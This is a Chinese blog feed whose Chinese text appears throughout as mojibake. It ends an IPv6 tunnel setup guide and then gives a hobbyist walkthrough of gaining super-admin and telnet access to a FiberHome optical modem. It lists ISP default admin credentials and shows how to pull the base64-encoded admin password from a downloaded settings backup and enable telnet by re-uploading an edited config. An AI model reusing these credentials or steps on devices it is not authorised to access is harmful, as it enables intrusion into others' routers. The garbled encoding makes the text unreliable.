è°·æ­Œçš„DNSæœåŠ¡å™¨ </p><pre class="language-bash" data-language="bash"><code class="language-bash">nameserver <span class="token number">2001</span>:4860:4860::8888nameserver <span class="token number">2001</span>:4860:4860::8844</code></pre><p>æˆ–è€…å›½å†…çš„å…¬å…±DNSï¼š<code>240c::6666</code> æˆ– <code>240c::6644</code></p><ul><li>æ·»åŠ è·¯ç”±</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">route -A inet6 <span class="token function">add</span> ::/0 dev he-ipv6</code></pre><p>å† ping ä¸€ä¸‹åº”è¯¥å¯ä»¥äº†å§ï¼ˆ</p><p>ä¸è¡Œå†é‡å¯è¯•è¯•ï¼ˆé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜å‘¢</p><hr><h2 id="0x05-Nginx-æ”¯æŒ-IPv6-è®¿é—®"><a href="#0x05-Nginx-æ”¯æŒ-IPv6-è®¿é—®" class="headerlink" title="0x05 Nginx æ”¯æŒ IPv6 è®¿é—®"></a>0x05 Nginx æ”¯æŒ IPv6 è®¿é—®</h2><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç›‘å¬ IPv6 ç«¯å£ã€‚</p><pre class="language-none"><code class="language-none">server {  listen 80;  listen [::]:80; // ç›‘å¬ IPv6 çš„ 80 ç«¯å£  # ...}server {  listen 443 ssl http2;   listen [::]:443 ssl http2; // ç›‘å¬ IPv6 çš„ 443 ç«¯å£  # ...}</code></pre><p>ç„¶è€Œï¼Œå‘ç°ä¸€ä¸ªæƒ…å†µï¼Œåªæœ‰å½“æœåŠ¡å™¨è®¿é—®IPv6çš„ç½‘ç«™çš„æ—¶å€™ï¼Œæˆ–è€…è¯´æœ‰ IPv6 æµé‡çš„æ—¶å€™ï¼Œå¤–ç½‘æ‰èƒ½é€šè¿‡è¿™ä¸ªå…¬ç½‘çš„IPv6åœ°å€è®¿é—®åˆ°æœåŠ¡å™¨emmmã€‚ï¼ˆæ‡µ </p><p>äºæ˜¯åŠ ä¸€ä¸ª cron è®¡åˆ’ï¼Œå®šæ—¶pingä¸€ä¸‹å¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> -e</code></pre><p>æ·»åŠ ä¸€ä¸ªè®¡åˆ’ã€‚</p><pre class="language-none"><code class="language-none">*/1 * * * * ping6 -c 1 he.net</code></pre><p>é‡å¯ cron ä½¿å…¶ç”Ÿæ•ˆã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl restart <span class="token function">cron</span></code></pre><p>æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ ping æ“ä½œï¼Œè¿™æ ·è®¿é—®å°±æ²¡é—®é¢˜äº†ã€‚</p><p><em>ï¼ˆä¸è¿‡æƒ³ä¸å¤§æ˜ç™½ä¸ºå•¥è¿™ä¸ªé€šé“ä¼šè‡ªåŠ¨æ–­å¼€ã€‚æœ‰äººè¯´ä¸ ip6tables æœ‰å…³ï¼Œä¸å¤§æ¸…æ¥šã€‚ã€‚ emmm</em></p><hr><h2 id="0x06-é…ç½®-DNS"><a href="#0x06-é…ç½®-DNS" class="headerlink" title="0x06 é…ç½® DNS"></a>0x06 é…ç½® DNS</h2><p>é…ç½®ä¸€æ¡<strong>AAAAè®°å½•æŒ‡å‘å…¬ç½‘çš„ IPv6 åœ°å€</strong>å³å¯ã€‚å¯ä»¥è¯•è¯•å¼€å¯CDNã€‚</p><p>è€Œåå°±å¯ä»¥é€šè¿‡åŸŸåè®¿é—®ç½‘ç«™äº†ã€‚</p><p>ä¸è¿‡æ²¡æœ‰ CDN çš„è¯åªèƒ½é€šè¿‡ IPv6 è¿›è¡Œè®¿é—®ã€‚</p><hr><h2 id="0x07-æ£€æŸ¥ç½‘ç«™æ˜¯å¦æ”¯æŒ-IPv6"><a href="#0x07-æ£€æŸ¥ç½‘ç«™æ˜¯å¦æ”¯æŒ-IPv6" class="headerlink" title="0x07 æ£€æŸ¥ç½‘ç«™æ˜¯å¦æ”¯æŒ IPv6"></a>0x07 æ£€æŸ¥ç½‘ç«™æ˜¯å¦æ”¯æŒ IPv6</h2><p>åˆ©ç”¨ <a href="http://ipv6-test.com/validate.php">http://ipv6-test.com/validate.php</a></p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ipv6test.png" alt="ipv6test"></p><hr><h2 id="0x08-è‡ªåŠ¨æ›´æ–°-Endpoint-IP"><a href="#0x08-è‡ªåŠ¨æ›´æ–°-Endpoint-IP" class="headerlink" title="0x08 è‡ªåŠ¨æ›´æ–° Endpoint IP"></a>0x08 è‡ªåŠ¨æ›´æ–° Endpoint IP</h2><p>å‰é¢è¯´åªè¦å…¬ç½‘çš„IPv4åœ°å€<strong>ç›¸å¯¹å›ºå®š</strong>å°±å¥½äº†ï¼Œè¿™é‡Œå°±è¿™ä¸ªæ„æ€å•¦ã€‚</p><p>HE è¿˜æ”¯æŒ<strong>ä¸ºåŠ¨æ€ IPv4 åœ°å€å»ºç«‹ IPv6 é€šé“</strong>ï¼Œè¿™é‡Œè¦ç”¨åˆ°ä»–æä¾›çš„APIäº†ã€‚</p><blockquote><p>Weâ€™ve added support for Dyn-compliant endpoint updates so that equipment talking this spec can very easily update your tunnel endpoint.</p><p><strong>Update URL:</strong> <a href="https://ipv4.tunnelbroker.net/nic/update">https://ipv4.tunnelbroker.net/nic/update</a>  (<em>ipv4 is important here, donâ€™t remove it</em>)<br><strong>Username:</strong> Your Tunnelbroker.net username<br><strong>Password:</strong> Tunnel specific authentication key (under Advanced on the tunnel  information page) if one is set, otherwise your Tunnelbroker.net  password.<br><strong>Hostname:</strong></p><ul><li>Numeric tunnel ID</li><li>Numeric tunnel ID in â€œtunnel#.tunnelbroker.netâ€ (<em>This host does not actually exist</em>)</li><li>Tunnel reverse host, aka â€œuser-#.tunnel.tserv#.loc#.ipv6.he.netâ€</li></ul></blockquote><p>æˆ–è€…ä¹Ÿå¯ä»¥è®¿é—®æ›´æ–°çš„URLã€‚</p><p>å°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šå†™ä¸ªè„šæœ¬æ£€æŸ¥å…¬ç½‘åœ°å€æœ‰æ²¡æœ‰æ›´æ–°å°±å¥½äº†ã€‚</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/Dynamic_Update.png" alt="åŠ¨æ€æ›´æ–°"></p><p><strong>è‡ªåŠ¨æ›´æ–°IPv4åœ°å€ï¼š</strong></p><p>To auto-detect your IPv4 address:</p><pre class="language-none"><code class="language-none">https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;</code></pre><p><strong>æ‰‹åŠ¨æŒ‡å®šæ›´æ–°çš„IPv4åœ°å€ï¼š</strong></p><p>To manually specific your IPv4 address:</p><pre class="language-none"><code class="language-none">https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;</code></pre><p><strong>å½“ç„¶ä¸æƒ³çœ‹çš„è¯å°±çœ‹å®Œæ•´ç‰ˆï¼š</strong></p><p>**TL;DR:**ï¼ˆ<code>Too long; Don't read</code>/ <code>Too long; Didn't read</code>ï¼‰</p><pre class="language-none"><code class="language-none">http[s]://[TB_USER:TB_PASS@]tunnelbroker.net/nic/update?[username=TB_USER&amp;password=TB_PASS&amp;]hostname=&lt;TUNNEL_ID|tunnelTUNNEL_ID.tunnelbroker.net|TB_USER-TUNNEL_LABEL.tserv#.LOC#.ipv6.he.net&gt;[&amp;myip=IPV4]</code></pre><p>åé¢å¯ä»¥è¯•ä¸€è¯•è¿™ä¸ªåŠŸèƒ½ hhhh</p><p>å½“ç„¶äº†ï¼ŒHEè¿˜è‡ªå¸¦äº† DNS è§£æï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹å‘¢ã€‚</p><p>ä¸‹é¢è¿˜æœ‰ä¸€äº›å…³äº IPv6 çš„æ‹“å±•çš„é“¾æ¥ã€‚</p><p>å¥½äº†å°±è¿™æ ·å§ã€‚</p><p>ï¼ˆæºœäº†æºœäº†</p><h2 id="Reference-amp-Extensive-Reading"><a href="#Reference-amp-Extensive-Reading" class="headerlink" title="Reference &amp; Extensive Reading"></a>Reference &amp; Extensive Reading</h2><p><a href="https://blog.csdn.net/kaikai0803/article/details/94615666">è®°ä¸€æ¬¡ç»™çº¿ä¸ŠæœåŠ¡å™¨æ·»åŠ IPv6æ”¯æŒçš„æ­¥éª¤</a></p><p><a href="https://wzfou.com/he-net-dns/">He.net DNSåŸŸåè§£æç”³è¯·ä½¿ç”¨-å…è´¹DDNSã€IPv6 åœ°å€å’ŒSlave DNS</a></p><p><a href="https://www.uulucky.com/show-224057.html">ç”³è¯· HE.NET IPv6 éš§é“ä»¥ä½¿ä¸»æœºæ”¯æŒ IPv6</a>  </p><p><a href="https://www.yorkchou.com/servarica.html">Servarica IPv6 Only VPSæŠ˜è…¾ä½“éªŒ</a></p><p><a href="https://www.bobobk.com/377.html">å¦‚ä½•ç»™é˜¿é‡Œäº‘ecså¼€å¯ipv6è®¿é—®</a></p><p><a href="http://www.yaocheap.com/phptec/817.html">é˜¿é‡Œäº‘centos6.8å¼€å¯ipv6é€šè¿‡appstoreå®¡æ ¸çš„æ–¹æ³•</a></p><p><a href="https://www.cnblogs.com/gscq073240/articles/7677345.html">é˜¿é‡Œäº‘æœåŠ¡å™¨ä»¥åŠCDNæ”¯æŒIPV6çš„æ–¹æ³•</a></p><p><a href="https://forums.he.net/index.php?topic=1994.msg11842#msg11842">Dyn-compliant Endpoint Updates</a></p><p>etc.</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Web </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> IPv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…‰çŒ«æŠ˜è…¾è®° | è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç &amp;å¼€å¯telnet&amp;IPv6&amp;æ¡¥æ¥å®½å¸¦</title>
      <link href="2020/02/27/Server_OpticalModem/"/>
      <url>2020/02/27/Server_OpticalModem/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ€è¿‘è§‰å¾—å®¶é‡Œçš„ç½‘é€Ÿæœ‰ç‚¹æ…¢ï¼Œä¸Šç€ç½‘è¯¾æˆ–è€…çœ‹ç€è§†é¢‘ï¼ŒWiFi è¿æ¥çš„è®¾å¤‡åŒæ—¶åœ¨ç”¨çš„è¯å°±å¼€å§‹å¡äº† emmmå°±å¾ˆéš¾å—ã€‚ğŸ™</p><p>ç„¶ååˆå¬è¯´ä¸‰å¤§è¿è¥å•†çš„å®½å¸¦å·®ä¸å¤šéƒ½åˆ†é… IPv6 äº†ï¼Œæ‰‹æœºçš„è¯è”é€šæµé‡åˆ†é… IPv6 åœ°å€ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œå¼€çƒ­ç‚¹è¿˜èƒ½ä¸‹å‘ IPv6 åˆ°å…¶ä»–è®¾å¤‡ï¼ˆç„¶é¹…æˆ‘è¿™é‡Œçš„ç§»åŠ¨å¥½åƒè¿˜æ²¡æœ‰ï¼‰ã€‚</p><p>äºæ˜¯å°±æƒ³æŠ˜è…¾ä¸€ä¸‹å®¶é‡Œçš„å…‰çŒ«/è·¯ç”±å™¨ï¼Œåæ­£å°±æ˜¯çæŠ˜è…¾å§ã€‚</p><p>è¿™ä¸ªå…‰çŒ«æ˜¯æœ‰ç‚¹å¹´çºªçš„ <strong>HG260GS-U</strong>ï¼Œçƒ½ç«å®¶çš„ã€‚ ç¡¬ä»¶ç‰ˆæœ¬ <strong>BCM.V2.0</strong> ï¼Œè½¯ä»¶ç‰ˆæœ¬ <strong>G00Y1.00M0001</strong> ã€‚</p><p>å¤§æ¦‚çš„å†…å®¹å°±æ˜¯â€”â€”</p><p>è·å–äº†è¶…çº§ç®¡ç†å‘˜å¯†ç ï¼Œå¼€å¯äº† Telnet ç®¡ç†ï¼Œå¯ç”¨äº† IPv6ï¼Œå¹¶å°è¯•äº†å®½å¸¦æ¡¥æ¥çš„æ”¹é€ ç­‰ç­‰ã€‚</p><br><hr><h2 id="0x01-è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç "><a href="#0x01-è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç " class="headerlink" title="0x01 è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç "></a>0x01 è·å–è¶…çº§ç®¡ç†å‘˜å¯†ç </h2><p>é€šè¿‡å…‰çŒ«çš„ç®¡ç†åœ°å€è¿æ¥åˆ°ç®¡ç†é¡µé¢ï¼Œä¸€èˆ¬æ˜¯ <code>192.168.1.1</code>ã€‚ç™»å½•ç•Œé¢å¦‚ä¸‹ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/login.png" alt="login"></p><p>å…‰çŒ«èƒŒé¢æœ‰ä¸€ä¸ª user ç”¨æˆ·çš„ä¿¡æ¯ï¼Œç™»å½•ä¹‹åçš„ç•Œé¢åŠŸèƒ½è´¼å°‘ï¼Œåªèƒ½çœ‹ä¸€ä¸‹è¿æ¥çŠ¶æ€ï¼Œè®¾ç½®ä¸€ä¸‹WIFIã€é™æ€è·¯ç”±ä¹‹ç±»çš„åŸºç¡€é…ç½®ï¼Œè¿å®½å¸¦è¿æ¥éƒ½è®¾ç½®ä¸äº†ã€‚</p><p>äºæ˜¯æƒ³åˆ°é€šè¿‡è¶…çº§ç®¡ç†å‘˜è¿›è¡Œç™»å½•ã€‚</p><p>åœ¨ç½‘ä¸Šæœäº†å„ç§é€šç”¨å¯†ç ï¼Œæ¯”å¦‚ç”¨æˆ·åã€å¯†ç åˆ†åˆ«ä¸º</p><blockquote><p>CUAdmin  CUAdmin</p><p>telecomadmin  nE7jA%5m</p><p>CMCCadmin  aDm8H%MdA</p><p>fiberhomehg2x0  hg2x0  ï¼ˆå·¥ç¨‹è´¦å·ï¼‰</p></blockquote><p>æœ‰å¯èƒ½ç™»å½•æ˜¯è¿™ä¸ªç½‘å€ï¼š<a href="http://192.168.1.1/cu.html">http://192.168.1.1/cu.html</a></p><p><strong>ç„¶è€Œéƒ½æ²¡æœ‰ç”¨ï¼</strong></p><p>å“¦å¯¹äº†ï¼Œè¿™ä¸ªå·¥ç¨‹è´¦å·ï¼ˆæ®è¯´æ˜¯éšè—ç”¨æˆ·ï¼‰è¿™æ ·å¼€å¯ï¼š</p><p>è®¿é—® <a href="http://192.168.1.1/logoffaccount.html">http://192.168.1.1/logoffaccount.html</a> ï¼Œå°†<strong>éšè—ç”¨æˆ·</strong>è®¾ç½®ä¸º<strong>å¯ç”¨</strong>ï¼Œè€Œåç‚¹å‡»<strong>ä¿å­˜/åº”ç”¨</strong>å³å¯ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/hidden_user.png" alt="hidden_user"></p><p><strong><em>ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œæ²¡ç”¨</em></strong></p><p>äºæ˜¯çœ‹äº†çœ‹ç½‘ä¸Šå¤§ä½¬ä»¬çš„éªšæ“ä½œï¼Œå‘ç°å¯ä»¥é€šè¿‡<strong>å¤‡ä»½è®¾ç½®</strong>çš„åŠæ³•è·å–åˆ°è¶…çº§ç®¡ç†å‘˜è´¦å·åŠå¯†ç ã€‚</p><h3 id="Step-1-ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•å…‰çŒ«"><a href="#Step-1-ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•å…‰çŒ«" class="headerlink" title="Step 1 ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•å…‰çŒ«"></a>Step 1 ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•å…‰çŒ«</h3><p>å°±æ˜¯å…‰çŒ«èƒŒåçš„é‚£ä¸ªç”¨æˆ·åå¯†ç å•¦ã€‚</p><h3 id="Step-2-ä¸‹è½½è®¾ç½®å¤‡ä»½æ–‡ä»¶"><a href="#Step-2-ä¸‹è½½è®¾ç½®å¤‡ä»½æ–‡ä»¶" class="headerlink" title="Step 2 ä¸‹è½½è®¾ç½®å¤‡ä»½æ–‡ä»¶"></a>Step 2 ä¸‹è½½è®¾ç½®å¤‡ä»½æ–‡ä»¶</h3><p>è®¿é—® <a href="http://192.168.1.1/backupsettings.conf">http://192.168.1.1/backupsettings.conf</a> ï¼Œä¸‹è½½é…ç½®æ–‡ä»¶<code>backupsettings.conf</code>ã€‚</p><p>æ³¨æ„ä¸€å®šè¦åœ¨ç™»é™†åæ‰ä¸‹è½½ï¼Œå¦åˆ™ä¸‹è½½å¾—åˆ°çš„æ–‡ä»¶å¹¶æ²¡æœ‰é…ç½®ä¿¡æ¯ï¼Œè€Œæ˜¯ä¸€ä¸ªè®©ä½ ç™»å½•ç•Œé¢çš„ HTML æ–‡ä»¶ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings_error.png" alt="é”™è¯¯ç¤ºèŒƒ"></p><p>æ­£ç¡®çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªxmlæ–‡æœ¬ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·çš„ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings.png" alt="æ­£ç¡®ç¤ºèŒƒ"></p><p>å¯ä»¥å‘ç°é‡Œé¢ä¿å­˜äº†æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ï¼ŒWANè¿æ¥ã€LANè¿æ¥ã€WiFiåŠWPSã€å®½å¸¦ä¿¡æ¯ã€Loidç­‰ç­‰éƒ½æœ‰ï¼Œå½“ç„¶ï¼Œè¶…çº§ç”¨æˆ·ä¿¡æ¯ä¹Ÿåœ¨ã€‚</p><p>è€Œä¸”è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ï¼ˆæ˜æ˜¾çš„ï¼‰åŠ å¯†ï¼Œæœ€å¤šåªæ˜¯ç”¨äº†ä¸ª<code>base64</code>ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/superadmin.png" alt="è¶…çº§ç”¨æˆ·"></p><p>è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·å°±åœ¨<code>DeviceInfo</code>ä¸‹çš„<code>X_CMCC_TeleComAccount</code>é‡Œã€‚</p><p><strong>ç”¨æˆ·åä¸º<code>admin</code>**ï¼Œ</strong>å¯†ç **é€šè¿‡<code>base64</code>è§£ç å¯ä»¥å¾—åˆ°ä¸º<code>Cmcc10086#</code>ã€‚</p><p>ï¼ˆBy the wayï¼Œuserç”¨æˆ·çš„å¯†ç åœ¨è¿™é‡Œå•¦â†“</p><p><img src="/2020/02/27/Server_OpticalModem/userinfo.png" alt="userä¿¡æ¯"></p><h3 id="Step3-ç™»å½•è¯•è¯•"><a href="#Step3-ç™»å½•è¯•è¯•" class="headerlink" title="Step3 ç™»å½•è¯•è¯•"></a>Step3 ç™»å½•è¯•è¯•</h3><p>æˆåŠŸç™»å½•ï¼Œç•Œé¢æ¯”useråŠŸèƒ½å¤šå¾—å¤šäº†ï¼Œå¯ä»¥é…ç½®å®½å¸¦ä¿¡æ¯ã€VLANã€USBå­˜å‚¨è¿œç¨‹ä¸‹è½½ç­‰ç­‰äº†ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/login_main.png" alt="ç™»é™†åçš„ç•Œé¢"></p><br><hr><h2 id="0x02-å¼€å¯-Telnet-ç®¡ç†"><a href="#0x02-å¼€å¯-Telnet-ç®¡ç†" class="headerlink" title="0x02 å¼€å¯ Telnet ç®¡ç†"></a>0x02 å¼€å¯ Telnet ç®¡ç†</h2><p>æŒ‰ç†è¯´æ˜¯å¯ä»¥åˆ©ç”¨å·¥ç¨‹è´¦å·è¿›å»å¼€å¯ Telnet çš„ï¼Œç„¶è€Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥è¿›ä¸å»emmm</p><p>æ‰¾ä¸ªç½‘ä¸Šçš„å›¾â†“</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable_web.png" alt="å¼€å¯telnet"></p><p>é‚£å°±**ç›´æ¥æ”¹é…ç½®æ–‡ä»¶å¥½å§ **233333</p><h3 id="Step-1-ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#Step-1-ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="Step 1 ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>Step 1 ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>é¦–å…ˆ<strong>å¤‡ä»½ä¸€ä»½ä¸Šé¢ä¸‹è½½çš„é…ç½®æ–‡ä»¶</strong>ï¼ˆæ”¹é”™äº†è¿˜å¯ä»¥æ¢å¤å˜›ï¼‰ï¼Œè€Œåæœç´¢<code>telnet</code>ï¼Œ<strong>æŠŠå®ƒè®¾ä¸º<code>TRUE</code>ã€‚</strong></p><p><strong>æ³¨æ„å¤§å°å†™å‘€ï¼</strong></p><p>å½“ç„¶å¦‚æœæƒ³è¦å¼€å¯ FTP çš„è¯å¯ä»¥é¡ºä¾¿å¼€å¯ä¸€ä¸‹hhhã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable.png" alt="å¼€å¯telnet"></p><h3 id="Step-2-ä¸Šä¼ é…ç½®æ–‡ä»¶"><a href="#Step-2-ä¸Šä¼ é…ç½®æ–‡ä»¶" class="headerlink" title="Step 2 ä¸Šä¼ é…ç½®æ–‡ä»¶"></a>Step 2 ä¸Šä¼ é…ç½®æ–‡ä»¶</h3><p>è®¿é—®<strong>æ›´æ–°è·¯ç”±å™¨é…ç½®</strong>çš„é¡µé¢ <a href="http://192.168.1.1/updatesettings.html">http://192.168.1.1/updatesettings.html</a></p><p>ï¼ˆå¯èƒ½éœ€è¦ç™»å½•ï¼‰</p><p><img src="/2020/02/27/Server_OpticalModem/updatesettings.png" alt="updatesettings"></p><p>é€‰æ‹©ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶ï¼Œç‚¹å‡» <strong>æ›´æ–°é…ç½®</strong>ã€‚</p><h3 id="Step-3-é‡å¯å…‰çŒ«"><a href="#Step-3-é‡å¯å…‰çŒ«" class="headerlink" title="Step 3 é‡å¯å…‰çŒ«"></a>Step 3 é‡å¯å…‰çŒ«</h3><p>ï¼ˆå¦‚æœæ²¡æœ‰è‡ªåŠ¨é‡å¯çš„è¯</p><p>å¯ä»¥é€‰æ‹©åœ¨ <strong>ç®¡ç†-è®¾å¤‡ç®¡ç†-è®¾å¤‡é‡å¯</strong> é‡Œé‡å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥å…³æ‰ç”µæºå†æ‰“å¼€233ã€‚æ€ä¹ˆå–œæ¬¢æ€ä¹ˆæ¥ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/reboot.png" alt="reboot"></p><h3 id="Step4-telnet-è¿æ¥å…‰çŒ«"><a href="#Step4-telnet-è¿æ¥å…‰çŒ«" class="headerlink" title="Step4 telnet è¿æ¥å…‰çŒ«"></a>Step4 telnet è¿æ¥å…‰çŒ«</h3><p>è€Œåå°±å¯ä»¥é€šè¿‡ telnet è¿æ¥åˆ°ä½ çš„å…‰çŒ«äº†ã€‚</p><p><strong>ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯<code>admin</code>ã€‚</strong></p><p><img src="/2020/02/27/Server_OpticalModem/telnet.png" alt="telnet"></p><p>å®ƒç”¨çš„æ˜¯ <strong>BCM96838</strong> è¿™ä¸ªèŠ¯ç‰‡ã€‚<em>ï¼ˆæ„Ÿå…´è¶£å¯ä»¥æœä¸€æœ</em></p><p>å‘ç°å®ƒå¹¶æ²¡æœ‰ cd è¿™ä¸ªcommandã€‚</p><pre class="language-none"><code class="language-none"> &gt; help?helplogoutexitquitrebootbrctlcatvirtualserverddnsdfloglevellogdestdumpcfgdumpmdmdumpeidmdmmeminfopspkilldumpsysinfodnsproxysyslogechoifconfigpingpspwdsntpsysinfotftpwlctlshowOmciStatslaseromciomcipmdumpOmciVoicedumpOmciEnetdumpOmciGemlaserarpdefaultgatewaydhcpserverdnslanlanhostspasswdppprestoredefaultroutesaveswversionuptimecfgupdateswupdateexitOnIdlewansetgetgendefsettingsloaddefsettingscheckdefsettingscomposenewsettingscreate_merge_presettingtransform_presettingupgradeledctlusbtestlsfacmodesimcardvoipteststartvoiptestendvoice_testphone_connectrecordpcmstartrecordpcmendStartCallStopCallStartRingStopRingPlayCNGToneStopCNGTonePlayDTMFTonefhvoiceredirectmcpctlitmswificard</code></pre><p>ä¸è¿‡å¥½åƒåŠŸèƒ½ä¹Ÿä¸å°‘çš„äºšå­ã€‚</p><p>çœ‹äº†ä¸€ä¸‹å­˜å‚¨ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/df.png" alt="df"></p><p>å†…å­˜ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/meminfo.png" alt="meminfo"></p><p>ç„¶åå‘ç°æœ‰ä¸€ä¸ª<strong>éšè—çš„<code>sh</code>æŒ‡ä»¤</strong>ï¼Œå¯ä»¥æ”¯æŒå¤§éƒ¨åˆ†çš„ Linux æŒ‡ä»¤å•¦~</p><p>çœ‹äº†ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># uname -a</span>Linux <span class="token punctuation">(</span>none<span class="token punctuation">)</span> <span class="token number">3.4</span>.11-rt19 <span class="token comment">#3 SMP PREEMPT Mon Jul 4 19:17:02 CST 2016 mips GNU/Linux</span></code></pre><p>webs ç›®å½•ä¸‹ä¸ºæ‰€æœ‰çš„å‰ç«¯ç½‘é¡µçš„æ–‡ä»¶ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/sh.png" alt="sh"></p><pre class="language-none"><code class="language-none">FHFactoryCheck.html                  ipsec.htmlFH_Simple_CloseHideWeb.html          ipsecview.htmlFH_Simple_FactoryRestore.html        ipv6lancfg.htmlFH_Simple_OpenHideWeb.html           itms_right.htmlStaticIpAdd.html                     itms_wrong.htmlStaticIpErr.html                     itmsuploadfinish.htmlareacode.js                          itmsuploadfinish_guangdong.htmlbackupsettings.html                  itmsuploadingimage.htmlbuildinfo.html                       itmsuploadingimage_guangdong.htmlcertadd.html                         itmsuploadreboot.htmlcertcaimport.html                    jquery.jscertcaview.html                      lanvlancfg.htmlcertimport.html                      lockerror.htmlcertloadsigned.html                  logconfig.htmlcertlocalview.html                   login.htmlcertreqshow.html                     loginerror.htmlcertshow.html                        logintro.htmlcfgepon.html                         logo.htmlcfgeth.html                          logoffaccount.htmlcfggpon.html                         logout.htmlcodepassword.html                    logview.htmlcolors.css                           macstudy.htmlctExternalApInfo_user.html           main.htmlctExternalApInfooffline.html         mainCT.htmlctStaticIpAdd.html                   menuCT.jsctTracerouteresult.html              menuTitle.jsctalgcfg.html                        menuTree.jsctdhcpcfg.html                       multicast.htmlctdhcpdevice.html                    password.htmlctdiag.html                          picctdiag_ping.html                     platconfig.htmlctdiag_tracert.html                  portName.jsctdiagmng.html                       portalmngr.htmlctdiagsystem.html                    portmap.htmlctdiagxPon.html                      portmapadd.htmlctdms.html                           portmapedit.htmlctdnsconfig.html                     pradd.htmlcteponinterfaceinfo.html             prmngr.htmlctexternalApInfo.html                pswdadmin.htmlctgponinterfaceinfo.html             pswduser.htmlctigmpproxy.html                     qoscls.htmlctigmpsnooping.html                  qosclsedit.htmlctinfo.html                          qosclsview.htmlctinfo_fujian.html                   qosqmgmt.htmlctipflt.html                         qosqueue.htmlctipfltblack.html                    qosqueueadd.htmlctipfltwhite.html                    qosview.htmlctlanbind.html                       rebootinfo.htmlctlogconfig.html                     redirect.htmlctlogflashview.html                  redirect_cardoffline.htmlctlogintro.html                      redirect_portal.htmlctlogview.html                       redirect_portal_confirm.htmlctloid.html                          redirect_uploadimage.htmlctmacflt.html                        register.htmlctmacpolicy.html                     register_anhui.htmlctmldproxy.html                      register_fail.htmlctmldsnooping.html                   register_fujian.htmlctmulticastvlan.html                 register_guangdong.htmlctpingresult.html                    register_guangdong_fail.htmlctpswdrelogin.html                   register_hainan.htmlctroute6add.html                     register_ing.htmlctstatslan.html                      register_ing_anhui.htmlctstatslan_user.html                 register_ing_card.htmlctusererror.html                     register_ing_fujian.htmlctuserpswd.html                      register_ing_guangdong.htmlctwan_ethinfo.html                   register_ing_guangdong_1.htmlctwanconfig.html                     register_ing_guangdong_refresh.htmlctwanconfig_user.html                register_ing_hainan.htmlctwaninfo.html                       register_ing_iframe.htmlctwaninfo6.html                      register_ing_iframe_refresh.htmlctwaninfo6_user.html                 register_ing_iframe_refresh_1.htmlctwaninfo_user.html                  register_ing_sichuan.htmlctwaninfoall.html                    register_limit.htmlctwaninfoallv6.html                  register_loid.htmlctwlanInfo.html                      register_restore.htmlctwlanInfo_user.html                 register_restore_remote.htmlctwlcfg.html                         register_restore_retry.htmlctwlsecurity.html                    register_restore_retry_sichuan.htmlddnsadd.html                         